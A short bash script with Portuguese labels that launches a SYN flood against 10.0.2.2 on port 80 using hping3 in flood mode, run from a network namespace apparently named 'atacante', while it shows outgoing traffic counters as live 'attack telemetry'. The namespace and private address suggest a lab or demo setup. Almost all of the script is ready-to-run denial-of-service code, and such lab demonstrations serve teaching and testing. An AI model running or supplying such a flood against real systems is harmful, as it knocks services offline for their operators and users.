#!/bin/bash
clear; echo "[!] INICIANDO ATAQUE VOLUMÉTRICO (SYN FLOOD) [!]"; sudo ip netns exec atacante hping3 -S -p 80 --flood 10.0.2.2 > /dev/null 2>&1 &
trap "sudo killall hping3 2>/dev/null; clear; echo '[*] Ataque Abortado.'; exit" INT
watch -n 1 -t "echo '🔥 TELEMETRIA DE ATAQUE - TRÁFEGO DE SAÍDA (TX) 🔥' && sudo ip netns exec atacante ip -s link show vpeer-ata"
